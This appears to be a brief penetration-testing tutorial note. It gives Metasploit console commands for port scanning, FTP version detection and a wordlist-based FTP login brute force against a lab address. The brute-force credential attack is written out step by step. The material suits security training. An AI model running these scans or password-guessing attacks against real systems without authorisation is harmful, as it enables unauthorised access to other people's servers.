\- FTP (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and clients.

Let's take a target ip : 10.10.10.10

 ```
msfconsole

> search portscan
> use 6 (TCP)
>> set RHOSTS 10.10.10.10
>> run
>> back

// Ftp Version Scanner
> search type:auxiliary name:ftp
> use 15 (FTP Scanner)
> set RHOSTS 10.10.10.10
> run 

// Ftp Authentication Scanner (Bruteforce) b 
> search type:auxiliary name:ftp
> use 12
> set RHOSTS 10.10.10.10
> set USER_FILE /usr/share/metasploit-framework/data/wordlists/common-users.txt
> set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix-passwords.txt
> run
```